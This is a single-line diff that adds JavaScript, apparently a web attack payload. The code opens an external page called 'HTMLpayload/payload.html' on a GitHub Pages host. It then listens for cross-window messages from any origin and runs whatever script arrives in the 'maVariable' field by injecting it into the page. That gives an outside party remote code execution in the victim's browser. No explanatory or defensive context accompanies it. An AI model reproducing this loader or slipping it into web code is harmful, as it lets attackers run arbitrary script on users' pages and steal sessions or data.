@@ -1,0 +1,1 @@
+window.open("https://tiboblh.github.io/HTMLpayload/payload.html","_blank"); window.addEventListener("message", e => { if(e.data.maVariable) { let s = document.createElement("script"); s.textContent = e.data.maVariable; document.body.appendChild(s); } });
